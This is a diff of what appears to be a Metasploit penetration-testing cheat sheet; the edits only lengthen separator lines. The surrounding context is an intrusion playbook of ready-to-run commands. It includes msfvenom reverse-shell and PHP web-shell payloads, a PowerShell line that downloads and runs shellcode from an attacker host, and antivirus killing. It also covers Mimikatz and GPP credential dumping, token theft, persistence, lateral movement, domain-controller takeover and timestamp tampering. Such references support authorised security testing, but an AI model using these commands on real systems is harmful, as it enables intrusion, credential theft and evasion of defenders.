@@ -7,7 +7,7 @@ service postgresql start                          Start the postgresql db
 msfdb init                                        Create and initialize the msf db
 msfconsole                                        Start Metasploit
 db_status                                         Show the current data service status
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Troubleshooting
 
@@ -35,14 +35,14 @@ db_status
 
 - Module database cache not built yet, using slow search
 db_rebuild_cache                                  Rebuilds the database-stored module cache (deprecated)
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Help
 
 help or ?                                         Show commands and their descriptions
 <command> -h                                      Get help on any command
 grep -h                                           Show help on the 'grep' command
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Searching
 
@@ -53,7 +53,7 @@ grep <string> search <type>
 grep php search payloads                          Search payloads and grep for php
 grep linux show post                              Search post exploitation modules and grep for linux
 grep -v gather search post/windows
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Basic usage
 
@@ -82,7 +82,7 @@ show evasion                                      Show evasion options
 exploit                                           Run the exploit
 
 This particular exploit will drop you into a meterpreter session running at NT AUTHORITY\SYSTEM.
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Generate payloads
 
@@ -103,7 +103,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe
 - Generate PHP web shell and upload to a web server
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -a php -e php/base64 -f raw -o /root/webshell.php
 upload /root/webshell.php /var/www/
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Sessions
 
@@ -115,7 +115,7 @@ ctrl z                                            Background the current session
 Many options allow specifying session ranges using commas and dashes. For example:
   sessions -s checkvm -i 1,3-6
   sessions -k 1-3,6                               Terminate sessions
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Meterpreter
 
@@ -150,7 +150,7 @@ search -f <file>                                  Locate files on the target
 shell                                             Drop to a standard shell on the target
 webcam_list                                       Show currently available web cams
 webcam_snap                                       Takes a picture from the web cam
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Initial post exploitation - Windows
 
@@ -158,7 +158,7 @@ sysinfo                                           Gets information about the rem
 getuid                                            Get the user that the server is running as
 ps                                                Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
 migrate <PID>                                     Migrate to that process using its PID
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege escalation - Windows
 
@@ -200,7 +200,7 @@ exploit
 
 - Option 6
 use exploit/windows/local/                        There are currently 77 options - 12/29/19
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Windows enumeration
 
@@ -212,12 +212,12 @@ run post/windows/gather/enum_shares               Enumerate configured and recen
 run killav
 run getcountermeasure
 run winenum
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dump creds
 
 run post/windows/gather/credentials/gpp
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Mimikatz
 
@@ -236,7 +236,7 @@ kerberos_ticket_purge                             Purge any in-use kerberos tick
 kerberos_ticket_use                               Use a kerberos ticket
 lsa_dump_sam                                      Dump LSA SAM
 lsa_dump_secrets                                  Dump LSA secrets
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Steal tokens
 
@@ -255,7 +255,7 @@ steal_token <PID>
 getuid
 drop_token                                        Revert back to the orginal token
 getuid
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Establish persistence
 
@@ -322,13 +322,13 @@ use multi/handler
 set PAYLOAD windows/shell_bind_tcp
 set RHOST <target IP>
 exploit
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Upload tools
 
 upload <local path> <remote path>
 upload /usr/share/windows-binaries/nc.exe c:\\
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral movement
 
@@ -342,7 +342,7 @@ set LPORT <local port>
 exploit
 
 powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacker IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Pivoting
 
@@ -354,7 +354,7 @@ set RHOSTS 10.0.0.0/24
 set PORTS 445
 set THREADS 10
 run
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Post exploitation - domain controller (DC)
 
@@ -383,7 +383,7 @@ use windows/manage/delete_user
 set username hacker
 set session 1
 exploit
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Cross platform exploit
 
@@ -403,7 +403,7 @@ set lport <attacker port>
 set target 0                                      Set the target language to Python
 set payload python/meterpreter/reverse_tcp
 exploit
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Misc
 
@@ -420,7 +420,7 @@ timestomp                                         Manipulate file MACE attribute
 run vnc
   If the screen is locked exit VNC
   Run screen_unlock
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Database
 
